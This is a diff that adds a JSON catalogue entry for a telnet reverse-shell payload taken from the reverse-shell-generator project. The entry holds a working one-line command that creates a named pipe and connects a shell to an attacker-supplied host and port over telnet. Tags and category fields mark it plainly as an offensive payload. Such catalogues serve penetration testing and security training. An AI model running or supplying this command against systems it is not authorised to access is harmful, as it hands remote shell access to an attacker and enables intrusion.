@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-telnet",
+  "name": "RSG · ReverseShell · telnet",
+  "command": "TF=$(mktemp -u);mkfifo $TF && telnet <lhost> <lport> 0<$TF | <shell> 1>$TF",
+  "description": "Reverse Shell payload — telnet (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/telnet/64",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
